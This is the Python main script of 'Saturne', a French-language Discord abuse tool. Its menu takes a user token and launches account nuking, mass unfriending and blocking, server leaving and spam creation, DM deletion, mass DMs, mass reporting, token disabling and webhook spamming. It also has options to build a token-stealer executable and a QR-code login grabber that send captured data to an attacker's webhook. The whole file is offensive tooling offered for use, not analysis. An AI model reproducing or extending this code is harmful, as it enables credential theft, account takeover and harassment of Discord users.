###############################################################
# ███████╗ █████╗ ████████╗██╗   ██╗██████╗ ███╗   ██╗███████╗
# ██╔════╝██╔══██╗╚══██╔══╝██║   ██║██╔══██╗████╗  ██║██╔════╝
# ███████╗███████║   ██║   ██║   ██║██████╔╝██╔██╗ ██║█████╗  
# ╚════██║██╔══██║   ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══╝  
# ███████║██║  ██║   ██║   ╚██████╔╝██║  ██║██║ ╚████║███████╗
# ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝
###############################################################
# Crée par GalackQSM
# Github: https://github.com/GalackQSM/Saturne
# Discord: https://discord.gg/saturnetools|XvjJpw4D3m
# © 2022 Saturne
###############################################################

import multiprocessing
import threading
import requests
import keyboard
import base64
import os

from time import sleep
from colorama import Fore

from util.plugins.common import *
from util.plugins.update import search_for_updates
import util.accountNuke
import util.dmdeleter
import util.info
import util.login
import util.groupchat_spammer
import util.massreport
import util.QR_Grabber
import util.seizure
import util.server_leaver
import util.spamservers
import util.statuschanger
import util.friend_blocker
import util.create_stealer_V2
import util.unfriender
import util.webhookspammer
import util.massdm
import util.tokendisable
import util.credits

threads = 3
cancel_key = "ctrl+x"

def main():
    setTitle(f"Saturne {THIS_VERSION}")
    clear()
    global threads
    global cancel_key
    if getTheme() == "saturne":
        banner()
    elif getTheme() == "dark":
        banner("dark")
    elif getTheme() == "fire":
        banner("fire")
    elif getTheme() == "water":
        banner("water")
    elif getTheme() == "neon":
        banner("neon")

    choice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Choisir: {Fore.RED}')
    if choice == "1":
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        Server_Name = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Nom des serveurs qui seront créés: {Fore.RED}'))
        message_Content = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Message qui sera envoyé à chaque ami: {Fore.RED}'))
        if threading.active_count() < threads:
            threading.Thread(target=util.accountNuke.Saturne_Nuke, args=(token, Server_Name, message_Content)).start()
            return


    elif choice == '2':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        processes = []
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = multiprocessing.Process(target=util.unfriender.UnFriender, args=(token, friend))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '3':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        if token.startswith("mfa."):
            print(f'{Fore.RESET}[{Fore.RED}Erreur{Fore.RESET}] : Juste un avertissement, Saturne ne pourra pas supprimer les serveurs car le compte a activé 2fa')
            sleep(3)
        processes = []
        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
        for guild in [guildsIds[i:i+3] for i in range(0, len(guildsIds), 3)]:
            t = multiprocessing.Process(target=util.server_leaver.Leaver, args=(token, guild))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break
                

    elif choice == '4':
        token = input(f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'{Fore.BLUE}Voulez-vous avoir une icône pour les serveurs qui seront créés?')
        yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}oui/non: {Fore.RED}')
        if yesno.lower() == "oui":
            image = input(f'Example: (C:\\Users\\myName\\Desktop\\Saturne\\ShitOn.png):\n{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Veuillez entrer l\'emplacement de l\'icône: {Fore.RED}')
            if not os.path.exists(image):
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Impossible de trouver "{image}" sur votre pc')
                sleep(3)
                main()
            with open(image, "rb") as f: _image = f.read()
            b64Bytes = base64.b64encode(_image)
            icon = f"data:image/x-icon;base64,{b64Bytes.decode()}"
        else:
            icon = None
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Noms de serveurs aléatoires
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Noms de serveur personnalisés  
                        ''')
        secondchoice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Deuxième choix: {Fore.RED}')
        if secondchoice not in ["1", "2"]:
            print(f'{Fore.RESET}[{Fore.RED}Erreur{Fore.RESET}] : Deuxième choix invalide')
            sleep(1)
            main()
        if secondchoice == "1":
            processes = []
            for i in range(25):
                t = multiprocessing.Process(target=util.spamservers.SpamServers, args=(token, icon))
                t.start()
                processes.append(t)
            while True:
                if keyboard.is_pressed(cancel_key):
                    for process in processes:
                        process.terminate()
                    main()
                    break

        if secondchoice == "2":
            name = str(input(
                f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Nom des serveurs qui seront créés: {Fore.RED}'))
            processes = []
            for i in range(25):
                t = multiprocessing.Process(target=util.spamservers.SpamServers, args=(token, icon, name))
                t.start()
                processes.append(t)
            while True:
                if keyboard.is_pressed(cancel_key):
                    for process in processes:
                        process.terminate()
                    main()
                    break


    elif choice == '5':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
                t = multiprocessing.Process(target=util.dmdeleter.DmDeleter, args=(token, channel))
                t.start()
                processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '6':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        message = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Message qui sera envoyé à chaque ami: {Fore.RED}'))
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
            t = multiprocessing.Process(target=util.massdm.MassDM, args=(token, channel, message))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '7':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'{Fore.MAGENTA}Démarrage du mode saisie {Fore.RESET}{Fore.WHITE}(Activer/désactiver le mode clair/sombre){Fore.RESET}\n')
        processes = [] 
        for i in range(threads):
            t = multiprocessing.Process(target=util.seizure.StartSeizure, args=(token, ))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '8':
        token = input(
        f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.info.Info(token)


    elif choice == '9':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.login.TokenLogin(token)

    elif choice == '10':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        processes = []
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = multiprocessing.Process(target=util.friend_blocker.Block, args=(token, friend))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '11':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Changer de statut
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Changer de bio
    {Fore.RESET}[{Fore.RED}3{Fore.RESET}] Changer HypeSquad    
                        ''')
        secondchoice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Paramètres: {Fore.RED}')
        if secondchoice not in ["1", "2", "3", "4"]:
            print(f'{Fore.RESET}[{Fore.RED}Erreur{Fore.RESET}] : Choix invalide')
            sleep(1)
            main()
        if secondchoice == "1":
            Status = str(input(
                f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Statut personnalisé: {Fore.RED}'))
            util.statuschanger.StatusChanger(token, Status)
        if secondchoice == "2":
            print("Pas terminé")
            sleep(1.5)
            main()
        if secondchoice == "3":
            print("Pas terminé")
            sleep(1.5)
            main()


    elif choice == '12':
        token = input(
        f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.tokendisable.TokenDisable(token)


    elif choice == '13':
        WebHook = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}URL du Webhook: {Fore.RED}')
        validateWebhook(WebHook)
        fileName = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Nom du fichier: {Fore.RED}'))
        util.create_stealer_V2.TokenGrabberV2(WebHook, fileName)


    elif choice == '14':
        WebHook = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}URL du Webhook: {Fore.RED}')
        validateWebhook(WebHook)
        util.QR_Grabber.QR_Grabber(WebHook)


    elif choice == '15':
        print(f"\n{Fore.RED}(le token que vous saisissez est le compte qui enverra les rapports){Fore.RESET}")
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        guild_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}ID du serveur: {Fore.RED}'))
        channel_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}ID du salon: {Fore.RED}'))
        message_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}ID du message: {Fore.RED}'))
        reason1 = str(input(
            '\n[1] Contenu illégal\n'
            '[2] Harcèlement\n'
            '[3] Liens de spam ou de phishing\n'
            '[4] L\'automutilation\n'
            '[5] Contenu NSFW\n\n'
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Raison: {Fore.RED}'))
        if reason1.upper() in ('1', 'CONTENU ILLÉGAL'):
            reason1 = 0
        elif reason1.upper() in ('2', 'HARCÈLEMENT'):
            reason1 = 1
        elif reason1.upper() in ('3', 'LIENS DE SPAM OU DE PHISHING'):
            reason1 = 2
        elif reason1.upper() in ('4', 'L\'AUTOMUTILATION'):
            reason1 = 3
        elif reason1.upper() in ('5', 'CONTENU NSFW'):
            reason1 = 4
        else:
            print(f"\nRaison invalide")
            sleep(1)
            main()
        util.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1)


    elif choice == "16":
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.groupchat_spammer.GcSpammer(token)


    elif choice == '17':
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Supprimer un webhook
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Spammer via webhook    
                        ''')
        secondchoice = int(input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Deuxième choix: {Fore.RED}'))
        if secondchoice not in [1, 2]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Deuxième choix invalide')
            sleep(1)
            main()
        if secondchoice == 1:
            WebHook = input(
                f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            try:
                requests.delete(WebHook)
                print(f'\n{Fore.GREEN}Webhook supprimé avec succès!{Fore.RESET}\n')
            except Exception as e:
                print(f'{Fore.RED}Erreur: {Fore.WHITE}{e} {Fore.RED}s\'est produit lors de la tentative de suppression du Webhook')

            input(f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Entrez n\'importe quoi pour continuer... {Fore.RED}')
            main()
        if secondchoice == 2:
            WebHook = input(
                f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            Message = str(input(
                f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Message: {Fore.RED}'))
            util.webhookspammer.WebhookSpammer(WebHook, Message)


    elif choice == '18':
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Changer de thème
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Quantité de threads
    {Fore.RESET}[{Fore.RED}3{Fore.RESET}] Annuler la clef
    {Fore.RESET}[{Fore.RED}4{Fore.RESET}] {Fore.RED}Quitter...    
                        ''')
        secondchoice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Paramètres: {Fore.RED}')
        if secondchoice not in ["1", "2", "3", "4"]:
            print(f'{Fore.RESET}[{Fore.RED}Erreur{Fore.RESET}] : Paramètre invalide')
            sleep(1)
            main()
        if secondchoice == "1":
            print(f"""
{Fore.GREEN}saturne: 1
{Fore.LIGHTBLACK_EX}Dark: 2
{Fore.RED}Fire: 3
{Fore.BLUE}Water: 4
{Fore.CYAN}N{Fore.MAGENTA}e{Fore.CYAN}o{Fore.MAGENTA}n{Fore.CYAN}:{Fore.MAGENTA} 5
""")
            themechoice = input(
                f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}thème: {Fore.RED}')
            if themechoice == "1":
                setTheme('saturne')
            elif themechoice == "2":
                setTheme('dark')
            elif themechoice == "3":
                setTheme('fire')
            elif themechoice == "4":
                setTheme('water')
            elif themechoice == "5":
                setTheme('neon')
            else:
                print(f'{Fore.RESET}[{Fore.RED}Erreur{Fore.RESET}] : Thème invalide')
                sleep(1.5)
                main()
            print_slow(f"{Fore.GREEN}Thème défini sur {Fore.CYAN}{getTheme()}")
            sleep(0.5)
            main()

        elif secondchoice == "2":
            print(f"{Fore.BLUE}Quantité actuelle de threads: {threads}")
            try:
                amount = int(
                    input(f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Quantité de threads: {Fore.RED}'))
            except ValueError:
                print(f'{Fore.RESET}[{Fore.RED}Erreur{Fore.RESET}] : Montant invalide')
                sleep(1.5)
                main()
            if amount >= 45:
                print(f"{Fore.RED}Désolé, mais avoir autant de discussions ne fera que vous limiter et ne pas bien finir")
                sleep(3)
                main()
            elif amount >= 15:
                print(f"{Fore.RED}ATTENTION! * ATTENTION! * ATTENTION! * ATTENTION! * ATTENTION! * ATTENTION! * ATTENTION!")
                print(f"avoir le nombre de threads défini sur 15 ou plus peut éventuellement devenir lent et augmenter les chances de limite de débit \ êtes-vous sûr de vouloir définir la limite de débit sur {Fore.YELLOW}{amount}{Fore.RED}?")
                yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}oui/non: {Fore.RED}')
                if yesno.lower() != "oui":
                    sleep(0.5)
                    main()
            threads = amount
            print_slow(f"{Fore.GREEN} définis sur {Fore.CYAN}{amount}")
            sleep(0.5)
            main()
        
        elif secondchoice == "3":
            print("\n","Info".center(30, "-"))
            print(f"{Fore.CYAN}Touche d'annulation actuelle: {cancel_key}")
            print(f"""{Fore.BLUE}Si vous voulez avoir ctrl + <key> vous devez taper ctrl+<key> | N'appuyez pas littéralement sur ctrl + <key>
{Fore.GREEN}Exemple: shift+Q

{Fore.RED}Vous pouvez avoir d'autres modificateurs au lieu de ctrl ⇣
{Fore.YELLOW}Tous les modificateurs de clavier:{Fore.RESET}
ctrl, shift, enter, esc, windows, left shift, right shift, left ctrl, right ctrl, alt gr, left alt, right alt
""")
            sleep(1.5)
            key = input(f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Clé: {Fore.RED}')
            cancel_key = key
            print_slow(f"{Fore.GREEN}Touche d'annulation définie sur {Fore.CYAN}{cancel_key}")
            sleep(0.5)
            main()

        elif secondchoice == "4":
            setTitle("Quitter...")
            choice = input(
                f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Êtes-vous sûr de vouloir quitter? (O pour confirmer): {Fore.RED}')
            if choice.upper() == 'O':
                clear()
                os._exit(0)
            else:
                main()

    elif choice == '19':
        ok = input(
        f'{Fore.GREEN}[{Fore.CYAN}>{Fore.GREEN}] {Fore.RESET}Faite entrer pour voir les crédits de Saturne: {Fore.RED}')
        util.credits.Credits(ok)

    else:
        clear()
        main()

if __name__ == "__main__":
    import sys
    if os.path.basename(sys.argv[0]).endswith("exe"):
        search_for_updates()
        with open(os.getenv("temp")+"\\saturne_proxies", 'w'): pass
        if not os.path.exists(os.getenv("temp")+"\\saturne_theme"):
            setTheme('saturne')
        clear()
        proxy_scrape()
        sleep(1.5)
        main()
    try:
        assert sys.version_info >= (3,7)
    except AssertionError:
        print(f"{Fore.RED}Votre version python ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) n'est pas compatible avec Saturne, veuillez télécharger python 3.7+")
        sleep(5)
        print("sortir...")
        sleep(1.5)
        os._exit(0)
    else:
        search_for_updates()
        with open(os.getenv("temp")+"\\saturne_proxies", 'w'): pass
        if not os.path.exists(os.getenv("temp")+"\\saturne_theme"):
            setTheme('saturne')
        clear()
        proxy_scrape()
        sleep(1.5)
        main()
    finally:
        Fore.RESET
